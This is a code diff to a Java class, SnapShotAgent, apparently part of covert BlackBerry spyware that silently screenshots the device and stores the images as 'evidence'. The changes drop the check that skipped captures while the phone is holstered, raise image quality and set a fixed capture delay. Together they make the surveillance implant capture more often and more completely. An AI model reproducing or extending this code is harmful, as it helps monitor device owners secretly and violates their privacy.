@@ -13,7 +13,6 @@ import java.io.EOFException;
 
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
-import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
@@ -26,9 +25,7 @@ import blackberry.evidence.EvidenceType;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
- * TODO : evitare lo snapshot se l'immagine e' nera. Cominciare a vedere se e'
  * in holster.
  * 
  * @author user1
@@ -38,11 +35,12 @@ public final class SnapShotAgent extends Agent {
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 60;
+    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
     private static final int MIN_TIMER = 1 * 1000;
+    private static final long SNAPSHOT_DELAY = 1000;
 
-    private int timerMillis = 60 * 1000;
+    private int timerMillis = 0;
     private boolean onNewWindow = false;
 
     /**
@@ -55,7 +53,8 @@ public final class SnapShotAgent extends Agent {
         super(Agent.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
                 "SnapShotAgent");
         //#ifdef DBC
-        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
+        Check.asserts(
+                Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
                 "Wrong Conversion");
         //#endif
     }
@@ -81,15 +80,8 @@ public final class SnapShotAgent extends Agent {
     public void actualRun() {
 
         //#ifdef DEBUG
-        debug.trace("Taking snapshot");
+        debug.trace("snapshot");
         //#endif
-
-        if (DeviceInfo.isInHolster()) {
-            //#ifdef DEBUG
-            debug.trace("In Holster, skipping snapshot");
-            //#endif
-            return;
-        }
 
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
@@ -101,7 +93,7 @@ public final class SnapShotAgent extends Agent {
         final Bitmap bitmap = getScreenshot();
 
         //#ifdef DEBUG
-        debug.trace("screenshot");
+        debug.info("Taking screenshot");
         //#endif
 
         // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
@@ -113,11 +105,8 @@ public final class SnapShotAgent extends Agent {
         //#ifdef DBC
         Check.requires(evidence != null, "Null log");
         //#endif
-        synchronized (evidence) {
-            evidence.createEvidence(getAdditionalData());
-            evidence.writeEvidence(plain);
-            evidence.close();
-        }
+        
+        evidence.atomicWriteOnce(getAdditionalData(),plain);
 
         //#ifdef DEBUG
         debug.trace("finished run");
@@ -128,7 +117,7 @@ public final class SnapShotAgent extends Agent {
     /**
      * @return
      */
-    public synchronized static Bitmap getScreenshot() {
+    public static Bitmap getScreenshot() {
         final Bitmap bitmap;
 
         final int width = Display.getWidth();
@@ -136,7 +125,6 @@ public final class SnapShotAgent extends Agent {
         bitmap = new Bitmap(width, height);
 
         //#ifdef DEBUG
-
         debug.trace("portrait: " + Display.getOrientation());
         debug.trace("w: " + width + " h:" + height);
         debug.trace("horizontal res: " + Display.getHorizontalResolution());
@@ -213,7 +201,7 @@ public final class SnapShotAgent extends Agent {
         }
 
         setPeriod(timerMillis);
-        setDelay(timerMillis);
+        setDelay(SNAPSHOT_DELAY);
 
         //#ifdef DEBUG
         debug.info("timer: " + timerMillis + " ms");
